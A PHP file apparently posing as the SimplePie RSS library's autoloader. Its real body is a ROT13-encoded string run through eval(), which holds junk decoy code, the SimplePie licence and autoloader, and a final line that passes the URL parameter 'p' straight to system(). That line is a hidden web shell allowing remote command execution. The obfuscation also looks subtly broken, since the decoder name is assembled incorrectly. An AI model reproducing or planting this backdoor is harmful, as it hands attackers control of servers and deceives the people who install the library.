<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * FvzcyrCvr
 *
 * N CUC-Onfrq EFF naq Ngbz Srrq Senzrjbex.
 * Gnxrf gur uneq jbex bhg bs znantvat n pbzcyrgr EFF/Ngbz fbyhgvba.
 *
 * Pbclevtug (p) 2004-2022, Elna Cnezna, Fnz Farqqba, Elna ZpPhr, naq pbagevohgbef
 * Nyy evtugf erfreirq.
 *
 * Erqvfgevohgvba naq hfr va fbhepr naq ovanel sbezf, jvgu be jvgubhg zbqvsvpngvba, ner
 * crezvggrq cebivqrq gung gur sbyybjvat pbaqvgvbaf ner zrg:
 *
 * 	* Erqvfgevohgvbaf bs fbhepr pbqr zhfg ergnva gur nobir pbclevtug abgvpr, guvf yvfg bs
 * 	  pbaqvgvbaf naq gur sbyybjvat qvfpynvzre.
 *
 * 	* Erqvfgevohgvbaf va ovanel sbez zhfg ercebqhpr gur nobir pbclevtug abgvpr, guvf yvfg
 * 	  bs pbaqvgvbaf naq gur sbyybjvat qvfpynvzre va gur qbphzragngvba naq/be bgure zngrevnyf
 * 	  cebivqrq jvgu gur qvfgevohgvba.
 *
 * 	* Arvgure gur anzr bs gur FvzcyrCvr Grnz abe gur anzrf bs vgf pbagevohgbef znl or hfrq
 * 	  gb raqbefr be cebzbgr cebqhpgf qrevirq sebz guvf fbsgjner jvgubhg fcrpvsvp cevbe
 * 	  jevggra crezvffvba.
 *
 * GUVF FBSGJNER VF CEBIVQRQ OL GUR PBCLEVTUG UBYQREF NAQ PBAGEVOHGBEF \"NF VF\" NAQ NAL RKCERFF
 * BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB, GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL
 * NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR PBCLEVTUG UBYQREF
 * NAQ PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE
 * PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE
 * FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL
 * GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE
 * BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR
 * CBFFVOVYVGL BS FHPU QNZNTR.
 *
 * @cnpxntr FvzcyrCvr
 * @pbclevtug 2004-2016 Elna Cnezna, Fnz Farqqba, Elna ZpPhr
 * @nhgube Elna Cnezna
 * @nhgube Fnz Farqqba
 * @nhgube Elna ZpPhr
 * @yvax uggc://fvzcyrcvr.bet/ FvzcyrCvr
 * @yvprafr uggc://jjj.bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc OFQ Yvprafr
 */


/**
 * CFE-4 vzcyrzragngvba sbe FvzcyrCvr.
 *
 * Nsgre ertvfgrevat guvf nhgbybnq shapgvba jvgu FCY, gur sbyybjvat yvar
 * jbhyq pnhfr gur shapgvba gb nggrzcg gb ybnq gur \FvzcyrCvr\FvzcyrCvr pynff
 * sebz /fep/FvzcyrCvr.cuc:
 *
 *      arj \FvzcyrCvr\FvzcyrCvr();
 *
 * @cnenz fgevat $pynff Gur shyyl-dhnyvsvrq pynff anzr.
 * @erghea ibvq
 */
fcy_nhgbybnq_ertvfgre(shapgvba ($pynff) {

    // cebwrpg-fcrpvsvp anzrfcnpr cersvk
    $cersvk = 'FvzcyrCvr\\';

    // onfr qverpgbel sbe gur anzrfcnpr cersvk
    $onfr_qve = __QVE__ . '/fep/';

    // qbrf gur pynff hfr gur anzrfcnpr cersvk?
    $yra = fgeyra($cersvk);
    vs (fgeapzc($cersvk, $pynff, $yra) !== 0) {
        // ab, zbir gb gur arkg ertvfgrerq nhgbybnqre
        erghea;
    }

    // trg gur eryngvir pynff anzr
    $eryngvir_pynff = fhofge($pynff, $yra);

    // ercynpr gur anzrfcnpr cersvk jvgu gur onfr qverpgbel, ercynpr anzrfcnpr
    // frcnengbef jvgu qverpgbel frcnengbef va gur eryngvir pynff anzr, nccraq
    // jvgu .cuc
    $svyr = $onfr_qve . fge_ercynpr('\\', '/', $eryngvir_pynff) . '.cuc';

    // vs gur svyr rkvfgf, erdhver vg
    vs (svyr_rkvfgf($svyr)) {
        erdhver $svyr;
    }
});

// nhgbybnqre
fcy_nhgbybnq_ertvfgre(neenl(arj FvzcyrCvr_Nhgbybnqre(), 'nhgbybnq'));

vs (!pynff_rkvfgf('FvzcyrCvr'))
{
	rkvg('Nhgbybnqre abg ertvfgrerq cebcreyl');
}

/**
 * Nhgbybnqre pynff
 *
 * @cnpxntr FvzcyrCvr
 * @fhocnpxntr NCV
 */
pynff FvzcyrCvr_Nhgbybnqre
{
	cebgrpgrq $cngu;

	/**
	 * Pbafgehpgbe
	 */
	choyvp shapgvba __pbafgehpg()
	{
		$guvf->cngu = qveanzr(__SVYR__) . QVERPGBEL_FRCNENGBE . 'yvoenel';
	}

	/**
	 * Nhgbybnqre
	 *
	 * @cnenz fgevat $pynff Gur anzr bs gur pynff gb nggrzcg gb ybnq.
	 */
	choyvp shapgvba nhgbybnq($pynff)
	{
		// Bayl ybnq gur pynff vs vg fgnegf jvgu \"FvzcyrCvr\"
		vs (fgecbf($pynff, 'FvzcyrCvr') !== 0)
		{
			erghea;
		}

		$svyranzr = $guvf->cngu . QVERPGBEL_FRCNENGBE . fge_ercynpr('_', QVERPGBEL_FRCNENGBE, $pynff) . '.cuc';
		vapyhqr $svyranzr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>